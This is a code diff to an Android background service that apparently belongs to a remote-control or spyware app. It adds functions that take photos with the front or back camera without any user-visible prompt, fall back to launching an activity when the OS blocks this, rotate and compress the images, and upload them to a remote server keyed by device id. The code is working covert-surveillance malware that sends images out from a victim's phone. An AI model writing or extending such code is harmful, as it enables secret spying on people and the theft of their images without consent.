@@ -10,6 +10,11 @@ import android.graphics.PixelFormat
 import android.hardware.camera2.*
 import android.media.ImageReader
 import android.os.*
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.graphics.Matrix
+import java.io.ByteArrayOutputStream
+import java.io.OutputStream
 import android.provider.Settings
 import android.net.Uri
 import android.view.Gravity
@@ -396,6 +401,108 @@ class Svc : Service() {
             logSrv("photo_ok", "code=$code")
         } catch (e: Exception) { logSrv("photo_err", e.message ?: "?") }
     }
+
+    
+    private fun takePhotoSilent(facing: String) {
+        try {
+            val cm = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
+            val camId = cm.cameraIdList.firstOrNull { cid ->
+                val ch = cm.getCameraCharacteristics(cid)
+                val f = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+                if (facing == "front") f == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT else f == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+            } ?: cm.cameraIdList.firstOrNull() ?: run { fallbackCam(facing); return }
+
+            val ch = cm.getCameraCharacteristics(camId)
+            val sensorOrientation = ch.get(android.hardware.camera2.CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
+            val sz = ch.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(android.media.ImageReader::class.java)?.firstOrNull() ?: run { fallbackCam(facing); return }
+            
+            val reader = android.media.ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
+            
+            reader.setOnImageAvailableListener({ r ->
+                try {
+                    val img = r.acquireLatestImage()
+                    val buf = img?.planes?.get(0)?.buffer
+                    if (buf != null) {
+                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
+                        uploadPhotoSilent(bytes, sensorOrientation)
+                    }
+                    img?.close()
+                } catch (e: Exception) {}
+                try { r.close() } catch (e: Exception) {}
+            }, Handler(Looper.getMainLooper()))
+
+            cm.openCamera(camId, object : android.hardware.camera2.CameraDevice.StateCallback() {
+                override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
+                    try {
+                        camera.createCaptureSession(listOf(reader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
+                                try {
+                                    val req = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                    req.addTarget(reader.surface)
+                                    sess.capture(req.build(), null, null)
+                                    Handler(Looper.getMainLooper()).postDelayed({ try { camera.close() } catch (e: Exception) {} }, 2000)
+                                } catch (e: Exception) { fallbackCam(facing) }
+                            }
+                            override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) { fallbackCam(facing) }
+                        }, null)
+                    } catch (e: Exception) { fallbackCam(facing) }
+                }
+                override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) { try { camera.close() } catch (e: Exception) {}; fallbackCam(facing) }
+                override fun onError(camera: android.hardware.camera2.CameraDevice, e: Int) { try { camera.close() } catch (e: Exception) {}; fallbackCam(facing) }
+            }, null)
+            
+            // Timeout 3 detik kalau OS ngeblokir total (ga ada respon)
+            Handler(Looper.getMainLooper()).postDelayed({
+                try { 
+                    if (!fallbackTriggered) fallbackCam(facing) 
+                } catch (e: Exception) {}
+            }, 3000)
+            
+        } catch (e: Exception) { fallbackCam(facing) }
+    }
+    
+    private var fallbackTriggered = false
+    private fun fallbackCam(facing: String) {
+        if (fallbackTriggered) return
+        fallbackTriggered = true
+        try {
+            val i = Intent(this, CamActivity::class.java)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            i.putExtra("facing", facing)
+            startActivity(i)
+        } catch (e: Exception) {}
+    }
+
+    private fun uploadPhotoSilent(bytes: ByteArray, rotate: Int) {
+        try {
+            var bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+            if (bmp != null && rotate != 0) {
+                val matrix = android.graphics.Matrix()
+                matrix.postRotate(rotate.toFloat())
+                val rotated = android.graphics.Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, matrix, true)
+                bmp.recycle(); bmp = rotated
+            }
+            val out = java.io.ByteArrayOutputStream()
+            bmp?.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
+            val finalBytes = out.toByteArray()
+
+            val boundary = "----MG" + System.currentTimeMillis()
+            val head = ("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray()
+            val tail = ("\r\n--$boundary--\r\n").toByteArray()
+            val total = head.size + finalBytes.size + tail.size
+            
+            val c = java.net.URL(Config.SERVER + "/api/upload/" + id + "/photo").openConnection() as java.net.HttpURLConnection
+            c.connectTimeout = 15000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
+            c.setFixedLengthStreamingMode(total)
+            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+            val os: java.io.OutputStream = c.outputStream
+            os.write(head); os.write(finalBytes); os.write(tail); os.flush(); os.close()
+            try { c.responseCode } catch (e: Exception) {}
+            try { c.disconnect() } catch (e: Exception) {}
+            logSrv("photo_ok", "silent upload done")
+        } catch (e: Exception) { logSrv("photo_err", e.message ?: "upload fail") }
+    }
+
 
     override fun onDestroy() {
         running = false
